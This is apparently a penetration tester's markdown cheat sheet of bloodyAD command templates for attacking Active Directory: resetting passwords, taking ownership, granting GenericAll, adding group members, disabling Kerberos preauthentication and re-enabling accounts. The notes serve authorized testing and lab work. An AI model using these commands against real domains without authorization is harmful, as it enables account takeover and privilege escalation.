# bloodyad
#plateform/linux #target/remote #cat/ATTACK

## change password / set password
```
bloodyAD --host <target> -d <domain> -u <user> -p '<passwd>' set password <target_user> '<new_passwd|Password123!>'
```

## Get writable 
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get writable
```

## Set owner
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' set owner '<object>' <our_user>
```

## Add GenericAll 
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add genericAll '<object>' <our_user>
```

## Add group member 
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add groupMember <group> <member>
```

## Disable preauth
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add uac '<object>' -f DONT_REQ_PREAUTH
```

## Enable Account
```
bloodyAD --host <IP_ADDRESS_OR_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' remove uac '<TARGET_USER>' -f ACCOUNTDISABLE
```


## Change attribute
```
bloodyAD --host "<IP_ADDRESS_OR_HOST>" -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' set object <TARGET_USER> <ATTRIBUTE> -v <ATTRIBUTE_VALUE>
```

